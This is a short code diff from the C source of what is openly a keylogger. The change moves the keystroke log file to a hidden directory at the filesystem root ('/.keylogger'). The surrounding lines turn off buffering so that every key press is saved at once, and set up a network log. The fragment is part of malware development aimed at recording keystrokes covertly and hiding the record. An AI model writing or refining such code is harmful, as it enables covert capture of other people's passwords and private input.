@@ -73,7 +73,7 @@ int main(int argc, char **argv)
 
     struct loginfo info = { network_log, NEVER_WRITTEN, 4 };
 
-    FILE *keylog_log = fopen("log/keylog.txt", "a");
+    FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "a");
     config.keylog_log = keylog_log;
     setbuf(keylog_log, NULL);  //Disable buffering to write on every KEY_PRESS
     
